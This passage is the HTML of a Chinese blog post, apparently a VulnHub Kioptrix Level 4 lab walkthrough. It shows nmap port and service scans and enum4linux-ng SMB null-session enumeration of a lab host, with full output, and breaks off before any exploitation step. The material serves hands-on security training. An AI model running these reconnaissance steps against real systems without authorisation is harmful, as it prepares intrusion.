@@ -1,0 +1,773 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.27.0" theme-name="Stellar" theme-version="1.27.0">
+  
+  <meta name="generator" content="Hexo 7.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>VulnHub-Kioptrix Level 4 受限 Shell 越狱 + Mysql UDF 提权 - SafeKiller Zone</title>
+
+  
+    <meta name="description" content="总字符数: 18.79K                代码: 15.99K, 文本: 0.58K               预计阅读时间: 1.20 小时              Overview   Name Template    Release Date 2024-03-01   Write-up Author kill3r   Machine Author kill3r">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub-Kioptrix Level 4 受限 Shell 越狱 + Mysql UDF 提权">
+<meta property="og:url" content="https://jiangjiyue.github.io/2024/03/01/70eef621/index.html">
+<meta property="og:site_name" content="SafeKiller Zone">
+<meta property="og:description" content="总字符数: 18.79K                代码: 15.99K, 文本: 0.58K               预计阅读时间: 1.20 小时              Overview   Name Template    Release Date 2024-03-01   Write-up Author kill3r   Machine Author kill3r">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402221146756.jpg">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280805678.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280805081.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280805553.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280805180.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280805067.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280805497.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280805025.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280806455.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280806983.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280806996.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280806944.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280806936.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402280806980.png">
+<meta property="article:published_time" content="2024-03-01T02:04:30.000Z">
+<meta property="article:modified_time" content="2024-07-28T01:47:44.000Z">
+<meta property="article:author" content="Kill3r">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="漏洞利用">
+<meta property="article:tag" content="攻防演练">
+<meta property="article:tag" content="靶机练习">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402221146756.jpg">
+  
+  
+  
+  <meta name="keywords" content="渗透测试,漏洞利用,攻防演练,靶机练习">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="SafeKiller Zone" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.27.0">
+
+  
+    <link rel="shortcut icon" href="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg">
+  
+
+  
+
+  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" /><link rel="stylesheet" href="/css/darkmode.css">
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">SafeKiller Zone</div><div class="sub normal cap">安全学的再好又有什么用</div><div class="sub hover cap" style="opacity:0"> 连自己喜欢的人都留不住</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="导航" href="/sites/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a><a class="nav-item" title="更多" href="/tools/" style="color:#d55afa"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M22 12c0 5.523-4.477 10-10 10S2 17.523 2 12S6.477 2 12 2s10 4.477 10 10" opacity=".5"/><path fill="currentColor" d="M12.75 9a.75.75 0 0 0-1.5 0v2.25H9a.75.75 0 0 0 0 1.5h2.25V15a.75.75 0 0 0 1.5 0v-2.25H15a.75.75 0 0 0 0-1.5h-2.25z"/></svg></a></nav>
+</div>
+<div class="widgets">
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">专栏：VulnHub</span></div><div class="widget-body"><a class="item" href="/2022/03/10/8c8446e0/"><span class="title">VulnHub-脏牛提权复现</span></a><a class="item" href="/2022/11/02/735afd67/"><span class="title">VulnHub-DC系列</span></a><a class="item" href="/2024/02/24/e36a7018/"><span class="title">VulnHub-Kioptrix Level 1 古老的 Apache Vuln</span></a><a class="item" href="/2024/02/26/7e189a50/"><span class="title">VulnHub-Kioptrix Level 2 简单的命令注入 + 内核提权</span></a><a class="item" href="/2024/02/28/aba73427/"><span class="title">VulnHub-Kioptrix Level 3 SQL 注入 + sudo 提权</span></a><a class="item active" href="/2024/03/01/70eef621/"><span class="title">VulnHub-Kioptrix Level 4 受限 Shell 越狱 + Mysql UDF 提权</span><svg class="active-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M21 11.098v4.993c0 3.096 0 4.645-.734 5.321c-.35.323-.792.526-1.263.58c-.987.113-2.14-.907-4.445-2.946c-1.02-.901-1.529-1.352-2.118-1.47a2.225 2.225 0 0 0-.88 0c-.59.118-1.099.569-2.118 1.47c-2.305 2.039-3.458 3.059-4.445 2.945a2.238 2.238 0 0 1-1.263-.579C3 20.736 3 19.188 3 16.091v-4.994C3 6.81 3 4.666 4.318 3.333C5.636 2 7.758 2 12 2c4.243 0 6.364 0 7.682 1.332C21 4.665 21 6.81 21 11.098" opacity=".5"/><path fill="currentColor" d="M9 5.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5z"/></svg></a></div></widget>
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/2024/11/04/fe2980d6/"><span class="title">CS-ShellCode加载器</span></a><a class="item title" href="/2023/03/11/247b757/"><span class="title">VulHub-Fastjson漏洞复现</span></a><a class="item title" href="/2023/04/28/76971e68/"><span class="title">VulHub-Tomcat漏洞复现</span></a><a class="item title" href="/2024/07/05/dd58c5ed/"><span class="title">应急响应之Webshell流量分析</span></a><a class="item title" href="/2024/10/27/77c80f0f/"><span class="title">CS-C语言总结</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/JiangJiYue/" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-github"></i></a><a class="social" href="javaScript:hud.toast('你在听🎵啦啦啦~');" rel="noopener noreferrer"><i class="fa-solid fa-music"></i></a><a class="social" href="https://space.bilibili.com/238008115" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-bilibili fa-bounce"></i></a><a class="social" href="/atom.xml" rel="noopener noreferrer"><i class="fa-solid fa-rss fa-shake"></i></a><a class="social" href="/comments/" rel="noopener noreferrer"><i class="fa-regular fa-comment-dots"></i></a><a class="social" href="javaScript:void(0);" rel="noopener noreferrer"><i class="fa-solid fa-circle-half-stroke fa-flip"></i></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/topic">专栏</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/2022/03/10/8c8446e0/">VulnHub</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-03-01T02:04:30.000Z">2024-03-01</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-07-28T01:47:44.000Z">2024-07-28</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>VulnHub-Kioptrix Level 4 受限 Shell 越狱 + Mysql UDF 提权</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">
+    <p>总字符数: 18.79K </p>
+    </div>
+    <div class="cell" style="">
+    <p>代码: 15.99K, 文本: 0.58K</p>
+    </div>
+    <div class="cell" style="">
+    <p>预计阅读时间: 1.20 小时</p>
+    </div>
+    </div>
+
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402221146756.jpg" alt="Escape" style="zoom: 20%;" />
+
+<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><table>
+<thead>
+<tr>
+<th align="center">Name</th>
+<th align="center">Template</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Release Date</td>
+<td align="center">2024-03-01</td>
+</tr>
+<tr>
+<td align="center">Write-up Author</td>
+<td align="center">kill3r</td>
+</tr>
+<tr>
+<td align="center">Machine Author</td>
+<td align="center">kill3r</td>
+</tr>
+<tr>
+<td align="center">Difficulty</td>
+<td align="center">Medium</td>
+</tr>
+<tr>
+<td align="center">User Flag</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">Root Flag</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">Link</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25">https://www.vulnhub.com/entry/kioptrix-level-13-4,25</a></td>
+</tr>
+</tbody></table>
+<h2 id="相关技能"><a href="#相关技能" class="headerlink" title="相关技能"></a>相关技能</h2><ol>
+<li>MySql UDF</li>
+<li>restricted Shell Bypass</li>
+</ol>
+<h2 id="薄弱点"><a href="#薄弱点" class="headerlink" title="薄弱点"></a>薄弱点</h2><ol>
+<li>MySql UDF</li>
+<li>restricted Shell Bypass</li>
+</ol>
+<h2 id="Nmap扫描"><a href="#Nmap扫描" class="headerlink" title="Nmap扫描"></a>Nmap扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ports=$(nmap -p- --min-rate=1000 -T4 192.168.150.130 | grep -oE <span class="string">&#x27;(^[0-9][^/tcp]*)&#x27;</span> | <span class="built_in">tr</span> <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">nmap -p<span class="variable">$ports</span> -sV -sC -O 192.168.150.130 -oN nmap.txt</span><br><span class="line"><span class="comment"># 第一行代码使用nmap命令扫描本地主机的所有端口（从1到65535），--min-rate=1000参数表示每秒发送最少1000个包，-T4参数表示设置扫描速度为快速扫描模式。</span></span><br><span class="line"><span class="comment"># grep -oE &#x27;(^[0-9][^/tcp]*)&#x27;用于提取输出结果中的端口号，tr &#x27;\n&#x27; &#x27;,&#x27;用于将提取的端口号按逗号分隔并拼接成一个字符串。</span></span><br><span class="line"><span class="comment"># 第二行代码使用nmap命令再次扫描指定的端口，-p$ports参数表示扫描之前提取的端口列表，-sV参数表示进行服务版本检测，-sC参数表示在扫描过程中使用默认脚本进行常见漏洞探测，-O参数表示进行操作系统版本检测，-oN nmap.txt参数表示将扫描结果保存到名为nmap.txt的文件中。</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kill3r)-[/home/kill3r]</span><br><span class="line">└─<span class="comment"># ports=$(nmap -p- --min-rate=1000 -T4 192.168.150.130 | grep -oE &#x27;(^[0-9][^/tcp]*)&#x27; | tr &#x27;\n&#x27; &#x27;,&#x27;)                                                </span></span><br><span class="line">┌──(root㉿kill3r)-[/home/kill3r]</span><br><span class="line">└─<span class="comment"># nmap -p$ports -sV -sC -O 192.168.150.130 -oN nmap.txt</span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 14:04 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.150.130</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)</span><br><span class="line">|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/<span class="number">5.2</span>.<span class="number">4</span>-<span class="number">2</span>ubuntu5.<span class="number">6</span> with Suhosin-Patch)</span><br><span class="line">|_http-server-header: Apache/<span class="number">2.2</span>.<span class="number">8</span> (Ubuntu) PHP/<span class="number">5.2</span>.<span class="number">4</span>-<span class="number">2</span>ubuntu5.<span class="number">6</span> with Suhosin-Patch</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line"><span class="number">139</span>/tcp open  netbios-ssn Samba smbd <span class="number">3</span>.X - <span class="number">4</span>.X (workgroup: WORKGROUP)</span><br><span class="line"><span class="number">445</span>/tcp open  netbios-ssn Samba smbd <span class="number">3.0</span>.<span class="number">28</span>a (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">09</span>:FE:DB (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least <span class="number">1</span> open and <span class="number">1</span> closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux <span class="number">2.6</span>.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:<span class="number">2.6</span></span><br><span class="line">OS details: Linux <span class="number">2.6</span>.<span class="number">9</span> - <span class="number">2.6</span>.<span class="number">33</span></span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Unix (Samba <span class="number">3.0</span>.<span class="number">28</span>a)</span><br><span class="line">|   Computer name: Kioptrix4</span><br><span class="line">|   NetBIOS computer name: </span><br><span class="line">|   Domain name: localdomain</span><br><span class="line">|   FQDN: Kioptrix4.localdomain</span><br><span class="line">|_  System time: <span class="number">2024</span>-<span class="number">02</span>-<span class="number">26</span>T09:<span class="number">05</span>:<span class="number">00</span>-<span class="number">05</span>:<span class="number">00</span></span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">|_clock-skew: mean: <span class="number">10</span>h30m00s, deviation: <span class="number">3</span>h32m07s, median: <span class="number">8</span>h00m00s</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">13.41</span> seconds</span><br></pre></td></tr></table></figure>
+
+<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><h3 id="SMB-枚举"><a href="#SMB-枚举" class="headerlink" title="SMB 枚举"></a>SMB 枚举</h3><blockquote>
+<p>Port: 139 389 445 636</p>
+</blockquote>
+<ul>
+<li><code>enum4linux-ng 127.0.0.1</code></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">$ enum4linux-ng  &lt;ip&gt;</span><br><span class="line">┌──(root㉿kali)-[/opt/vulnhub/0x04]</span><br><span class="line">└─<span class="comment"># enum4linux-ng 192.168.150.130 &gt; smb.result</span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/opt/vulnhub/0x04]</span><br><span class="line">└─<span class="comment"># more smb.result</span></span><br><span class="line"> ==================================================</span><br><span class="line">|    OS Information via RPC <span class="keyword">for</span> 192.168.150.130    |</span><br><span class="line"> ==================================================</span><br><span class="line">[*] Enumerating via unauthenticated SMB session on 445/tcp</span><br><span class="line">[+] Found OS information via SMB</span><br><span class="line">[*] Enumerating via <span class="string">&#x27;srvinfo&#x27;</span></span><br><span class="line">[+] Found OS information via <span class="string">&#x27;srvinfo&#x27;</span></span><br><span class="line">[+] After merging OS information we have the following result:</span><br><span class="line">OS: Linux/Unix (Samba 3.0.28a)         </span><br><span class="line">OS version: <span class="string">&#x27;4.9&#x27;</span>                  </span><br><span class="line">OS release: not supported            </span><br><span class="line">OS build: not supported                    </span><br><span class="line">Native OS: Unix  </span><br><span class="line">Native LAN manager: Samba 3.0.28a            </span><br><span class="line">Platform <span class="built_in">id</span>: <span class="string">&#x27;500&#x27;</span>                </span><br><span class="line">Server <span class="built_in">type</span>: <span class="string">&#x27;0x809a03&#x27;</span>                    </span><br><span class="line">Server <span class="built_in">type</span> string: Wk Sv PrQ Unx NT SNT Kioptrix4 server (Samba, Ubuntu)                                                    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/opt/vulnhub/0x04]</span><br><span class="line">└─<span class="comment"># cat smb.result | grep user</span></span><br><span class="line">[+] Server allows session using username <span class="string">&#x27;&#x27;</span>, password <span class="string">&#x27;&#x27;</span></span><br><span class="line">[*] Check <span class="keyword">for</span> random user</span><br><span class="line">[+] Server allows session using username <span 